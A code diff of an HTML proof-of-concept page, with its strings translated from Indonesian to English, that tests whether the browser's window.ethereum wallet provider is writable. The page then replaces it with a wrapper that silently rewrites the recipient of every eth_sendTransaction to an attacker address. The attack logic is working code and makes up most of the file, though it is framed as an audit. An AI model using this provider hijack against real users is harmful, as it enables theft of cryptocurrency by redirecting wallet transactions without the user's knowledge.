@@ -1,17 +1,17 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web3 Provider Check</title>
+    <title>Global Scope Provider Hijacking & Parameter Tampering Proof</title>
     <style>
         body { font-family: monospace; background: #121212; color: #00ff00; padding: 20px; }
         pre { white-space: pre-wrap; word-wrap: break-word; }
     </style>
 </head>
 <body>
-    <h3>Provider Audit Log:</h3>
-    <pre id="log">Inisialisasi...</pre>
+    <h3>Global Provider Hijacking & Tampering Audit Log:</h3>
+    <pre id="log">Initializing audit...</pre>
 
 <script>
 const logEl = document.getElementById('log');
@@ -21,7 +21,7 @@ function addLog(msg) {
 
 (async () => {
     if (!window.ethereum) {
-        addLog("[-] window.ethereum tidak ditemukan.");
+        addLog("[-] window.ethereum not found.");
         return;
     }
 
@@ -29,7 +29,7 @@ function addLog(msg) {
     addLog(`[i] Writable: ${desc.writable}`);
 
     if (!desc.writable) {
-        addLog("[-] Objek terkunci.");
+        addLog("[-] Provider object is locked (immutable).");
         return;
     }
 
@@ -41,19 +41,19 @@ function addLog(msg) {
         chainId: realProvider.chainId,
         request: async (args) => {
             if (args.method === "eth_sendTransaction" && args.params?.[0]) {
-                addLog(`[!] Intersep to: ${args.params[0].to}`);
+                addLog(`[!] Intercepted recipient (to): ${args.params[0].to}`);
                 args.params[0].to = attacker;
-                addLog(`[!] Dialihkan ke: ${attacker}`);
+                addLog(`[!] Redirected to attacker: ${attacker}`);
             }
             return realProvider.request(args);
         }
     };
 
-    addLog("[+] window.ethereum berhasil dikuasai.");
+    addLog("[+] window.ethereum successfully hijacked.");
 
     try {
         const accounts = await realProvider.request({ method: "eth_requestAccounts" });
-        addLog(`[+] Akun: ${accounts[0]}`);
+        addLog(`[+] Connected Account: ${accounts[0]}`);
 
         await window.ethereum.request({
             method: "eth_sendTransaction",
@@ -63,7 +63,7 @@ function addLog(msg) {
                 value: "0x0"
             }]
         });
-        addLog("[+] Selesai.");
+        addLog("[+] Execution completed.");
     } catch (e) {
         addLog(`[-] Error: ${e.message}`);
     }
